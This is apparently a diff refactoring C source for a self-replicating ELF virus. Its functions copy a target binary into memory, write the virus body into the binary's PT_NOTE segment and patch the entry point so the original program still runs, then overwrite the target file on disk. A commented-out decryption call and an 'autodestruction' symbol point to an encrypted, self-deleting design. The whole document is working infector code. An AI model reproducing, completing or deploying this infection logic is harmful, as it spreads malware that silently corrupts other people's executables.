@@ -4,28 +4,25 @@
 /// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-__attribute__((always_inline)) static inline void write_on_memory(const struct s_host *host, char *ptr)
+__attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
 {
-	char *dst = ptr;
-	char *src = (char *)host->header;
+	const size_t payload_size = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));
 
-	const size_t payload_size = host->note->self->p_filesz + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
-
-	for (register size_t index = 0; index < host->note->data->p_offset + host->note->data->p_filesz; index++)
+	for (register size_t index = 0; index < segment[DATA]->p_offset + segment[DATA]->p_filesz; index++)
 		*dst++ = *src++;
 
 	for (register size_t index = 0; index < payload_size; index++)
 		*dst++ = '*';
 }
 
-__attribute__((always_inline)) static inline void replicate_on_memory(const struct s_host *host, char *ptr)
+__attribute__((always_inline)) static inline void replicate_on_memory(char *dst, Elf64_Phdr **segment)
 {
-	_memcpy(ptr + host->note->self->p_offset, __entry, host->note->self->p_filesz);
+	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
 }
 
-__attribute__((always_inline)) static inline void patch_entry_point(const struct s_host *host, char *ptr)
+__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
 {
-	char *tmp = ptr + host->note->self->p_offset + ((void *)execution - (void *)__entry);
+	char *tmp = dst + host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);
 
 	while (true)
 	{
@@ -37,11 +34,11 @@ __attribute__((always_inline)) static inline void patch_entry_point(const struct
 		tmp++;
 	}
 
-	const int offset = (void *)(ptr + (host->note->self->p_offset + host->note->self->p_filesz)) - (void *)tmp;
-	const int entry_point = host->old_entry - host->new_entry - (host->note->self->p_filesz - (offset - JMP_SIZE));
+	const int offset = (void *)(dst + (host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz)) - (void *)tmp;
+	const int entry_point = host->entry[OLD] - host->entry[NEW] - (host->segment[NOTE]->p_filesz - (offset - JUMP_SIZE));
 
-	_memcpy(ptr + host->note->self->p_offset, __entry, host->note->self->p_filesz);
-	_memcpy(ptr + host->note->self->p_offset + (host->note->self->p_filesz - offset), &entry_point, sizeof(int));
+	_memcpy(dst + host->segment[NOTE]->p_offset, __entry, host->segment[NOTE]->p_filesz);
+	_memcpy(dst + host->segment[NOTE]->p_offset + (host->segment[NOTE]->p_filesz - offset), &entry_point, sizeof(int));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -62,7 +59,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	char *ptr;
 	int fd;
 
-	const size_t filesize = host->note->self->p_offset + host->note->self->p_filesz;
+	const size_t filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;
 
 	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 	{
@@ -70,9 +67,9 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		goto label;
 	}
 
-	write_on_memory(host, ptr);
-	replicate_on_memory(host, ptr);
-	patch_entry_point(host, ptr);
+	write_on_memory(ptr, (char *)host->header, host->segment);
+	replicate_on_memory(ptr, host->segment);
+	patch_entry_point(ptr, host);
 	//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
 
 	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
